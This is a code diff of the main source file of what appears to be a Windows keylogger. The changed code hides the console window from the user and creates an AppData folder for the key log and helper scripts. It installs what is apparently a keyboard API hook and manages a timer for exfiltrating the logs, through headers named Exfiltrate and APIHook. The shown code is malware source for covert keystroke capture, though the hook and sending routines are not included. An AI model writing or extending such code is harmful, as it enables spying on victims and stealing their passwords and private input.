@@ -3,60 +3,47 @@
 
 #include <iostream>
 #include <Windows.h>
-#include "Auxiliary.h"
+#include "IO.h"
 #include "Keyboard.h"
 #include "Encoder.h"
-#include "IO.h"
-#include "Timer.h" //Remove or replace w/ something better
+#include "Timer.h"
 #include "Exfiltrate.h"
 #include "APIHook.h"
+#include "Auxiliary.h"
 
 using std::cout;
-
-//Method Prototypes
-void hideConsole();
-bool isConsoleVisible();
 
 
 int main()
 {
     
-    hideConsole();
+    //Hide console window from user.
+
+    Auxiliary::hideConsole();
+
+    //If console window is hidden, then...
     
-    if (!isConsoleVisible())
+    if (!Auxiliary::isConsoleVisible())
     {
-        MSG Msg;
+        //Create the directory where the key log, error log, as well as helper scripts will be stored.
 
         IO::createDirectory(IO::getAppDataPath(true));
+
         APIHook::installHook();
+
+        MSG Msg;
+
+        //Dummy loop to keep execution going
 
         while (GetMessage(&Msg, NULL, 0, 0))
         {
             TranslateMessage(&Msg);
             DispatchMessage(&Msg);
         }
-        
-        APIHook::mailTimer.Stop();
+
+        APIHook::logExfilTimer.stopTimer();
 
     }
-    else
-    {
-        exit(-1);
-    }
-
-    
 
     return 0;
-}
-
-void hideConsole()
-{
-    //This returns a windows handle (HWND) to ShowWindow() which will in turn hide it, use SW_RESTORE to bring back!
-
-    ::ShowWindow(GetConsoleWindow(), SW_HIDE);
-}
-
-bool isConsoleVisible()
-{
-    return ::IsWindowVisible(::GetConsoleWindow());
 }
